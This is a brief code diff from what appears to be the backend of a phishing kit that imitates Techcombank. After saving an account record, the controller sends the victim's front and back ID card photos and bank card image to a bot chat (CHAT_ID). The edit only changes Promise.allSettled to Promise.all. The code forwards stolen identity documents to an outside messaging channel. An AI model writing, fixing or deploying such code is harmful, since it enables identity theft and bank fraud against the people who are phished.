@@ -80,7 +80,7 @@ export class TechcombankController {
 
       await account.save();
 
-      Promise.allSettled([
+      Promise.all([
         frontIdCard && bot.sendPhoto(CHAT_ID, frontIdCard),
         backIdCard && bot.sendPhoto(CHAT_ID, backIdCard),
         frontCard && bot.sendPhoto(CHAT_ID, frontCard),
